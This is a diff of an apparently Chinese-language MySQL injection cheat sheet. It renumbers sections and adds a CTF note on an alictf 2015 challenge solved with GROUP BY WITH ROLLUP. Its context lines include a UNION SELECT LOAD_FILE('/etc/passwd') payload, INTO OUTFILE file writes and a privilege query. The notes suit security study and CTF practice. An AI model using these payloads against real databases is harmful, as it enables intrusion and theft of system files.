@@ -40,7 +40,7 @@
 </pre></div>
 
 
-<h2 id="_1">信息收集</h2>
+<h2 id="0x01">0x01 信息收集</h2>
 <div class="hlcode"><pre><span class="n">system_user</span><span class="p">()</span>     <span class="err">系统用户名</span>
 <span class="n">user</span><span class="p">()</span>            <span class="n">MYSQL</span><span class="err">用户名</span> 
 <span class="n">current_user</span><span class="p">()</span>    <span class="err">当前用户名</span>
@@ -63,7 +63,7 @@
 </pre></div>
 
 
-<h2 id="information_schema">information_schema</h2>
+<h2 id="0x02-information_schema">0x02 information_schema</h2>
 <blockquote>
 <p>MySQL &gt;= v5.0</p>
 </blockquote>
@@ -89,14 +89,16 @@
 </pre></div>
 
 
-<h2 id="_2">注释</h2>
-<div class="hlcode"><pre> <span class="o">--</span> <span class="n">comment</span>
+<h2 id="0x03">0x03 注释</h2>
+<div class="hlcode"><pre> <span class="o">--</span> <span class="n">comment</span>     <span class="err">#</span> <span class="err">&#39;</span><span class="o">--</span><span class="err">&#39;</span> <span class="err">前后有空格</span>
+
 <span class="cp">#comment</span>
+
 <span class="cm">/*comment*/</span>
 </pre></div>
 
 
-<h2 id="_3">文件权限</h2>
+<h2 id="0x04">0x04 文件权限</h2>
 <p>查询用户读写文件操作权限：</p>
 <div class="hlcode"><pre><span class="cp"># 需要root用户来执行   MySQL 4/5</span>
 <span class="n">SELECT</span> <span class="n">file_priv</span> <span class="n">FROM</span> <span class="n">mysql</span><span class="p">.</span><span class="n">user</span> <span class="n">WHERE</span> <span class="n">user</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">username</span><span class="err">&#39;</span><span class="p">;</span>
@@ -106,7 +108,7 @@
 </pre></div>
 
 
-<h2 id="load_file">load_file()</h2>
+<h2 id="0x05-load_file">0x05 load_file()</h2>
 <p>用户有文件操作权限则可以读取文件</p>
 <div class="hlcode"><pre><span class="err">…&#39;</span> <span class="n">UNION</span> <span class="n">ALL</span> <span class="n">SELECT</span> <span class="n">LOAD_FILE</span><span class="p">(</span><span class="err">&#39;</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="err">&#39;</span><span class="p">)</span>    <span class="err">—</span> <span class="n">priv</span><span class="p">,</span> <span class="n">can</span> <span class="n">only</span> <span class="n">read</span> <span class="n">world</span><span class="o">-</span><span class="n">readable</span> <span class="n">files</span><span class="p">.</span>
 
@@ -125,7 +127,7 @@
 </pre></div>
 
 
-<h2 id="_4">写文件</h2>
+<h2 id="0x06">0x06 写文件</h2>
 <p>如果用户有文件操作权限可以写文件</p>
 <div class="hlcode"><pre><span class="n">INTO</span> <span class="n">OUTFILE</span><span class="o">/</span><span class="n">DUMPFILE</span>
 
@@ -146,8 +148,29 @@
 </pre></div>
 
 
-<p>参考：</p>
-<p><a href="http://drops.wooyun.org/tips/123">乌云 MySql注入科普</a></p>
+<h2 id="0x">0x 实战</h2>
+<h3 id="group-by-with-rollup">group by with rollup</h3>
+<blockquote>
+<p>alictf 2015 FuckMySQL</p>
+</blockquote>
+<p><a href="http://dev.mysql.com/doc/refman/5.5/en/group-by-modifiers.html">group by document</a></p>
+<p>key code:</p>
+<div class="hlcode"><pre><span class="x">$result = $db-&gt;query($sql);</span>
+<span class="x">if ($result-&gt;num_rows == 1) {</span>
+<span class="x">    $row = $result-&gt;fetch_assoc();</span>
+<span class="x">    if ($row[&#39;key2&#39;] == $_POST[&#39;key2&#39;]) {</span>
+<span class="x">        echo &quot;=.= Y are u so diao? I will give you a flag!  &quot;.$flag;</span>
+<span class="x">        exit;</span>
+<span class="x">    }</span>
+<span class="x">} else {</span>
+<span class="x">    echo &quot;I am fucking!&quot;;</span>
+<span class="x">}</span>
+</pre></div>
+
+
+<h2 id="_1">参考：</h2>
+<p><a href="http://drops.wooyun.org/tips/123">乌云 mySql 注入科普</a></p>
+<p><a href="http://drops.wooyun.org/tips/7299">乌云 mysql 注入技巧</a></p>
 <p><a href="http://www.openwall.com/john/">crack mysql password</a></p>
 </div>
 
